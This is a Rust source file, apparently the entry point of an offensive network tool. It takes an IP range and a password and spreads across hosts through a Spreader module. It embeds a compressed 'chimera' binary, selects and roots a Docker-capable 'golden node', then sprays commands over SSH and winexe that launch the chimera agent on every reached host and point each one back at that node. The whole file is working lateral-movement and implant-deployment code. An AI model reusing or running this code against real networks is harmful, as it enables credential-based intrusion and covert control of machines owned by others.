// mod enumeration;
mod api;
// mod init;
mod net;
use clap::{arg as carg, command, value_parser};

use std::collections::BinaryHeap;
use std::sync::{Arc, Mutex};
use std::io::Read;
// use enumeration::ping;
//use std::future::Future;
use crate::net::communicator::{Credentials, Session};
// use crate::net::spread::spreader::Spreader;
// use crate::net::spread::spreader::ConnectionPool;
use crate::net::winexe::*;
use tokio::sync::watch;
use flate2::read::ZlibDecoder;
use std::process::Command;

// const CHIMERA: &[u8] = include_bytes!("../bin/chimera64.zlib");
const COMPRESSED_CHIMERA: &[u8] = include_bytes!("../bin/chimera_win.zlib");

struct MemoryReport;

impl Drop for MemoryReport {
    fn drop(&mut self) {
        // Use an OS-specific command to get memory usage
        // This is an example for Linux using `ps`
        let output = Command::new("ps")
            .arg("-o")
            .arg("rss=")
            .arg("-p")
            .arg(std::process::id().to_string())
            .output()
            .expect("Failed to execute command");

        let memory_usage = String::from_utf8_lossy(&output.stdout);
        println!("Memory Usage at Exit: {} KB", memory_usage.trim());
    }
}

fn decompress_data(compressed_data: &[u8]) -> Vec<u8> {
    let mut decoder = ZlibDecoder::new(compressed_data);
    let mut decompressed_data = Vec::new();
    decoder.read_to_end(&mut decompressed_data).unwrap();
    decompressed_data
}


#[tokio::main]
async fn main() {

    let matches = command!()
        .arg(carg!(-r --range <IP_RANGE>)
            .required(true)
            .value_parser(value_parser!(String)))
        .arg(carg!(-p --password <PASSWORD>)
            .required(true)
            .value_parser(value_parser!(String))).get_matches();

    let range = matches.get_one::<String>("range").unwrap();
    let password = matches.get_one::<String>("password").unwrap();



    let (api_key_sender, mut api_key_receiver) = watch::channel(String::new());
    let shared_api_key = Arc::new(api_key_sender);


    // Self::start_winexe_container(self.container_path.clone().unwrap()).await?;


    // Decompressed data is created at startup and should live throughout the application lifetime
    let chimera_win = decompress_data(COMPRESSED_CHIMERA);
    let chimera_win_arc = Arc::new(chimera_win);


    // Initialize the binary heap
    let server_heap = Arc::new(Mutex::new(BinaryHeap::new()));

    // Fetch srv_handle and srv from api::start_server
    let (srv, srv_handle) = api::start_server(shared_api_key.clone(), server_heap.clone(), chimera_win_arc).await;

    tokio::spawn(srv);


    //WinexeClient::start_winexe_container("/tmp/".into()).await.unwrap();

    let start_tio = std::time::Instant::now();
    let mut x = crate::net::spread::spreader::Spreader::new(range, password).await;

    x.spread().await;

    let golden_node;

    loop {
        if server_heap.lock().unwrap().len() <= 0 {
            panic!("No nodes suitable nodes found!");
        } else if let Some(node) = server_heap.lock().unwrap().pop() {
            println!("{:?}", node);
            if node.supports_docker {
                golden_node = node;
                break;
            }
        }
    }

    let golden_ip = &golden_node.ip.to_string();

    let _ = x.root(golden_ip).await;

    // Wait for the API key to be updated
    let mut api_key = String::new();
    while api_key.is_empty() {
        println!("Waiting for API Key...");
        api_key_receiver.changed().await.unwrap();
        api_key = api_key_receiver.borrow().clone();
    }

    let nix_cmd = format!("/tmp/chimera init -m {} -k {}", golden_ip, api_key);
    let win_cmd = format!("C:\\temp\\chimera.exe init -m {} -k {}", golden_ip, api_key);

    println!("Nix Command: {}", nix_cmd);

    let cmd_futures = vec![
        x.command_spray("SSH", &nix_cmd, vec![]),
        x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]),
    ];

    futures::future::join_all(cmd_futures).await;
    //x.command_spray("SSH", &nix_cmd, vec![]).await;
    //x.command_spray("WINEXE", &win_cmd, vec![&golden_ip]).await;


    srv_handle.stop(true).await;
    x.close().await;
    println!("{:?}", golden_node);

    let _memory_report = MemoryReport;
    println!("Total Elapsed Time {:?}", start_tio.elapsed());
}
